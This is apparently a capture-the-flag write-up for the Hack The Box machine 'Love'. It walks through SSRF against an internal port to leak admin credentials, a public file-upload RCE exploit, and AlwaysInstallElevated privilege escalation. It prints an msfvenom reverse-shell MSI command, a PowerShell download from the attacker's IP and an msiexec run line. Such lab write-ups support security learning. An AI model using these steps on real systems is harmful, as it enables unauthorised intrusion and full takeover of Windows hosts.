 `nmap` found some open ports, too much to be a windows machine.

Then I did a service recognition of the ports I found.

```

After reading all this information about the services. I found some domains: `staging.love.htb` `love.htb`.

I added to my `/etc/hosts`.

Lets check out the domains.

## HTTP-TCP 80. (love.htb)
<img src="/assets/img/love/1.png">

I saw that the webpage is a login for "Voting System".

#### SearchSploit.

I use `searchsploit`, and I tried to find some vulnerabilities to webpage.

#### Directory Brute Force.

I did a `Directory Brute Force` to see the directories at the domain.

<img src="/assets/img/love/2.png">

I tried some bruteforce for the login, but got no success.

## TCP 80 (staging.love.htb)

<img src="/assets/img/love/3.png">

This domain is a file scanning "free file scanner". But the home page gave me no information, lets check the top bar, and there is some "demo". 

<img src="/assets/img/love/4.png">

The `demo page` is an scanning URL file, I tried to get a file from my own machine and it works, but this is not the way to hack this machine, there is an other way.

### SSRF.

I tried to do some server-side request forgery (SSRF), as I saw before, there are some open ports. what happen if I do a `localhost` url scanning?

<img src="/assets/img/love/5.png">

It will give me the domain `love.htb`. So I remember that there are some open ports I couldn't see, lets try to enumerate them here. So I made it to made a petition to itself, cause maybe it can get access to this open ports that I can't.

<img src="/assets/img/love/6.png">

After trying some ports, the one that gave me something interesting was the port `5000` cause this port gave me a password.

Then I got credentials (password) from a user, didn't know the user. but I tried default users. And may I ask... where? well! i tried to the home page at the voting system page. Didn't work.

But At the beginning I made a `fuzzing` and find there is a `admin` directory. I provide `admin` user and the password I got.

<img src="/assets/img/love/8.png">

I got access as admin.

But this is not the end. You must get a shell as admin or user. Then, at the beginning I made a `searchsploit` command that show me some exploits to get shell. The interesting one was the third one.

```text
Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)          | php/webapps/49445.py
```

Then I read the script, looks like we must change some information at the script

<img src="/assets/img/love/7.png">

Then there was a problem with the script, I read the script again, but I saw that the directories it is looking at, dont exist at the machine, cause again, at the beginning we made a directory discovery and did not found something about `/votesystem/` but it have the same directory without it. lets remove it.

Then the script worked and I got shell as `phoebe` user.

<img src="/assets/img/love/9.png">


## ROOT.

### enumeration.

After I got access as the user `phoebe` I tried to enumerate manualy. But couldn't.

### winPEAS

I used the tool `winPEAS` to enumerated some information. And find something.

    AlwaysInstallElevated set to 1 in HKLM!
    AlwaysInstallElevated set to 1 in HKCU!  
```

### AlwaysInstallElevated
Looks like there is a `AlwaysinstallElevated`. What this means, it means any user can install `.msi` file as `administrator` and I can use it to get privilige scalation.

I created my own.

``` text
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.32 LPORT=443 -f msi -o priv.msi
```

Now I could pass the file to the machine.

```text
powershell wget http://10.10.16.32/priv.msi -outfile priv.msi
```

After I passed the file, I started listening on `port 443` and execute the `.msi` file.

```text
msiexec /quiet /qn /i rev.msi
```

<img src="/assets/img/love/10.png">
<img src="/assets/img/love/11.png">

Now The machine is mine.
